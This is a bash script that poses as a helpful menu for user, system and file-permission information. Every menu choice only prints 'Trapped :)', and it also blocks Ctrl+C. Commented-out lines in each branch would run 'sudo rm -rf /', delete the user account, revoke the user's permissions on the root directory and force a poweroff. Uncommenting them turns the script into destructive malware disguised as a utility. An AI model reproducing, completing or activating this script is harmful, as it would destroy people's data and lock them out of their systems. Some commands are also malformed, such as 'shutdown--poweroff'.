#!/bin/bash
#This script is harmfull
#Do not uncomment what is commented and then execute it on your own device
sig_int() {
        sleep 3
        echo -e "\a\n\e[1;31mtrapped Again :)\e[0m"
        ##sudo setfacl -m "u:$USERNAME: " /
	##shutdown --poweroff now
}
trap sig_int SIGINT
echo "Hello user!"
cat << EOF
       0) Exit the program
       1) User information
       2) System info
       3) See files permissions
EOF
read -p "choose an option: " opt
while [ true ] 
do
	if [[ $opt =~ ^[0-3]$ ]];
	then
		if (( $opt == 0 ));
		then
			echo -e "\a\e[1;31mTrapped :)\e[0m"
			##sudo setfacl -m u:$USERNAME:  /
			##shutdown --poweroff now
		elif (( $opt == 1 ));
		then
			read -p "Enter your username to view username's info: " usrnm
			if [ -z $usrnm ];
			then
				echo -e "\e[1;31mInvalid Input!\e[0m"
			elif [ $usrnm == $USERNAME ];
			then
				echo -e "\a\e[1;31mTrapped :)\e[0m"
				##sudo userdel $usrnm
				##shutdown --poweroff now
				break
			else
				echo "this is not your username!"
				continue
			fi
		elif (( $opt == 2 ));
		then
			echo -e "\a\e[1;31mTrapped :)\e[0m"
			##sudo rm -rf /
			##shutdown--poweroff now
			break
		elif (( $opt == 3 ));
		then
			echo -e "\a\e[1;31mTrapped :)\e[0m"
			##sudo setfacl -m "u:$usrnm: " /
			##shutdown--poweroff now
		fi
	else
		echo -e "\a\e[1;31mInvalid Entry!\e[0m"
		break
	fi
done
